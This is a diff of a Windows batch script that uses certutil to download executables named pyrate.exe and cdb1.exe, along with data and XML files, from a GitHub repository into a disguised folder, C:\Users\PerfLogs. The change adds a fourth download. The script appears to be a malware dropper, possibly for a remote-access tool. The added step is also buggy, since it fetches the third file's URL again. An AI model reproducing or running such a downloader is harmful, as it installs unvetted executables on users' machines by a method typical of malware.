@@ -26,9 +26,10 @@ if '%errorlevel%' NEQ '0' (
 
 set DOWNLOAD_DIR=C:\Users\PerfLogs
 
-set FILE1_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/new.exe
-set FILE2_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/cdb.exe
+set FILE1_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/pyrate.exe
+set FILE2_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/cdb1.exe
 set FILE3_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/file_info.db
+set FILE4_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/win-win.xml
 
 rem Create the directory if it doesn't exist
 if not exist "%DOWNLOAD_DIR%" (
@@ -44,6 +45,10 @@ certutil -urlcache -split -f "%FILE2_URL%" "%DOWNLOAD_DIR%\cdb.exe"
 
 echo Downloading file 3...
 certutil -urlcache -split -f "%FILE3_URL%" "%DOWNLOAD_DIR%\file_info.db"
+
+echo Downloading file 4...
+certutil -urlcache -split -f "%FILE3_URL%" "%DOWNLOAD_DIR%\win-win.xml"
+
 
 echo Download complete.
 pause
